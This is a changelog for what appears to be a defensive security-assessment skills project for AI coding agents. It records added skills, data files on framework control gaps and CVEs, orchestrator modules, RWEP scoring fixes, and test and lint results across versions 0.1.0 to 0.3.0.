- Lint compliance backfill: 14 skills updated to satisfy the 7-required-section body contract from CLAUDE.md without rewriting any existing content. Added sections preserve mid-2026 grounding, real CVE / ATLAS / framework refs, and RWEP-anchored prioritization throughout.
- Frontmatter completeness: `pqc-first`, `skill-update-loop`, `zeroday-gap-learn` now carry the full required field set (`atlas_refs`, `attack_refs`, `framework_gaps`) per the CLAUDE.md skill spec.

### Data
- `data/framework-control-gaps.json` — added `NIST-800-53-SC-7` (Boundary Protection) entry. Documents how AI-API C2 routes through allowlisted provider domains (api.openai.com, api.anthropic.com, generativelanguage.googleapis.com) and defeats boundary inspection. Maps to `AML.T0096`, `AML.T0017`, `T1071`, `T1102`, `T1568`. Closes the orphaned-reference gap that the lint gate caught in `ai-c2-detection`.

### Verification
- 110/110 tests passing (`npm test`)
- 16/16 skills passing lint (`npm run lint`)
- All 6 predeploy gates green (`npm run predeploy`)

## 0.2.0 — 2026-05-11

### Skills (15th added)
- `security-maturity-tiers` — Four-tier security maturity model with RWEP-indexed priorities and MCP audit integration

### Infrastructure added
- `lib/sign.js` — Ed25519 keypair management and skill signing utility
- `lib/verify.js` — Upgraded from SHA-256 to Ed25519 cryptographic signature verification
- `lib/framework-gap.js` — Framework lag scorer with 7 compliance theater pattern detectors
- `orchestrator/scanner.js` — Domain scanner (kernel, MCP, crypto, AI-API, framework) using shell-injection-safe execFileSync/spawnSync
- `orchestrator/dispatcher.js` — Skill router: finding → skill dispatching, natural language routing
- `orchestrator/pipeline.js` — Multi-agent pipeline coordination with currency scoring
- `orchestrator/event-bus.js` — Event-driven architecture (ExceptdEventBus) for CISA KEV, ATLAS releases, framework amendments
- `orchestrator/scheduler.js` — Weekly currency checks, monthly CVE validation, annual skill audit
- `orchestrator/index.js` — CLI entrypoint (scan, dispatch, currency, report, watch, validate-cves)
- `package.json` — Node.js 24 LTS pinning (>=24.0.0 <25.0.0), npm scripts for all orchestrator commands
- `.gitignore` — Starts with `.*` catch-all; whitelists tracked dotfiles

### Configuration files added
- `AGENT.md` — Agent-agnostic copy of CLAUDE.md (no Claude-specific language)
- `CONTEXT.md` — Universal AI context file: skill system orientation, RWEP explanation, data files, orchestrator usage
- `.cursorrules` — Cursor-specific skill system config with MCP audit paths
- `.github/copilot-instructions.md` — GitHub Copilot skill system configuration

### Data completeness
- `data/atlas-ttps.json` — 9 MITRE ATLAS v5.1.0 TTPs with framework gap analysis and detection guidance
- `data/global-frameworks.json` — 14-jurisdiction GRC registry with patch SLAs and notification windows
- `data/framework-control-gaps.json` — Added 11 entries: NIS2-Art21-patch-management, NIST-800-53-CM-7, ISO-27001-2022-A.8.30, SOC2-CC9-vendor-management, NIST-800-53-SC-28, NIST-800-53-SI-12, NIST-AI-RMF-MEASURE-2.5, ISO-27001-2022-A.8.16, SOC2-CC7-anomaly-detection, CIS-Controls-v8-Control7 (11 total additions)
- `data/zeroday-lessons.json` — Added CVE-2026-43284 and CVE-2026-43500 lessons; now covers all 5 catalog CVEs

### RWEP formula correction
- **Bug fix**: `ai_factor` now applies to `ai_discovered` OR `ai_assisted_weaponization` (was: weaponization only)
- **Bug fix**: `reboot_required` now always adds +5 when patch requires reboot (was: conditional on !live_patch_available)
- **Blast radius scale**: extended from 0-15 to 0-30 to properly capture population-level risk
- **Recalculated RWEP scores** (all formula-consistent):
  - CVE-2026-31431: 90 (was 96 — narrative error)
  - CVE-2026-43284: 38 (was 84 — factors didn't sum to stored score)
  - CVE-2026-43500: 32 (was 81 — same)
  - CVE-2025-53773: 42 (was 91 — CVSS overscored; no KEV, suspected exploitation)
  - CVE-2026-30615: 35 (was 94 — CVSS dramatically overscored; supply-chain prerequisite)
- **Narrative**: Copy Fail (CVSS 7.8 / RWEP 90) vs Windsurf MCP (CVSS 9.8 / RWEP 35) demonstrates RWEP provides correct prioritization in both directions
- Added `live_patch_available`, `live_patch_tools`, `ai_discovered` to CVE_SCHEMA_REQUIRED
- Added `complexity_notes` field to CVE-2026-43500
- CVE-2026-43284 `live_patch_available` corrected to false (kpatch RHEL-only, not population-level available)

### CLAUDE.md additions
- Hard Rule 11: No-MVP ban — half-implemented skill is worse than no skill
- Hard Rule 12: External data version pinning — ATLAS v5.1.0 current pinned version
- Hard Rule 13: Skill integrity verification via Ed25519 (lib/sign.js + lib/verify.js)
- Non-developer contribution section (GitHub Issue → Skill Request template)
- Pre-ship checklist expanded to 14 items
- Quick skill reference table (15 skills)

---

## 0.1.0 — 2026-05-01

### Initial release

**Skills (14 — security-maturity-tiers added in 0.2.0):**
- `kernel-lpe-triage` — Linux kernel LPE assessment (Copy Fail, Dirty Frag)
- `ai-attack-surface` — Comprehensive AI/ML attack surface assessment (ATLAS v5.1.0)
- `mcp-agent-trust` — MCP trust boundary enumeration and hardening
- `framework-gap-analysis` — Framework control → current TTP gap analysis
- `compliance-theater` — Seven-pattern compliance theater detection
- `exploit-scoring` — Real-World Exploit Priority (RWEP) scoring
- `rag-pipeline-security` — RAG pipeline threat model (no framework coverage)
- `ai-c2-detection` — SesameOp/PROMPTFLUX/PROMPTSTEAL detection and response
- `policy-exception-gen` — Defensible exception templates for architectural realities
- `threat-model-currency` — 14-item threat model currency assessment
- `global-grc` — 14-jurisdiction GRC mapping with universal gap declaration
- `zeroday-gap-learn` — Zero-day learning loop (CVE → control gap → framework gap)
- `pqc-first` — Post-quantum cryptography first mentality with version gates and loopback learning
- `skill-update-loop` — Meta-skill for keeping all skills current

**Data files:**
- `data/cve-catalog.json` — CVE-2026-31431, CVE-2026-43284, CVE-2026-43500, CVE-2025-53773, CVE-2026-30615
- `data/atlas-ttps.json` — MITRE ATLAS v5.1.0 TTPs for AI attack classes
- `data/framework-control-gaps.json` — NIST, ISO, SOC 2, PCI, NIS2, CIS documented gaps
- `data/global-frameworks.json` — 14-jurisdiction framework registry
- `data/exploit-availability.json` — PoC status and weaponization tracking
- `data/zeroday-lessons.json` — Learning loop output for 5 documented CVEs

**Infrastructure:**
- `sources/` — Primary source registry, validation protocol, multi-agent research verification
- `agents/` — threat-researcher, source-validator, skill-updater, report-generator definitions
- `reports/templates/` — Executive summary, compliance gap, zero-day response templates
- `lib/scoring.js` — RWEP scoring engine with schema validation
- `lib/ttp-mapper.js` — Control ID → TTP gap mapper
- `lib/framework-gap.js` — Framework lag scorer

**Architecture:**
- Forward watch mechanism in every skill's YAML frontmatter
- Loopback learning encoded in skill-update-loop and pqc-first
- Source validation gate before any data enters the catalog
- Multi-agent coordination protocol (threat-researcher → source-validator → skill-updater → report-generator)
- RWEP scoring (CVSS + KEV + PoC + AI-acceleration + blast radius + live-patch factors)
- Compliance theater detection (7 patterns with specific detection tests)
- 14-jurisdiction global GRC coverage
- PQC version gates: OpenSSL 3.5+, Go 1.23+, Bouncy Castle 1.78+
- Hard algorithm deprecation table with sunset reasoning

**ATLAS version:** 5.1.0 (November 2025)
**Threat review date:** 2026-05-01

---

## Forthcoming in 0.3.0

- `sources/validators/cve-validator.js` — NVD API cross-check script
- `sources/validators/kev-validator.js` — CISA KEV feed cross-check
- `reports/templates/technical-assessment.md`
- `reports/templates/threat-model-update.md`
- `agents/framework-analyst.md` — Framework analyst agent definition
- Integration tests for `lib/scoring.js`
- Ed25519 signatures for all 15 skills (`node lib/sign.js generate-keypair && sign-all`) — requires key ceremony
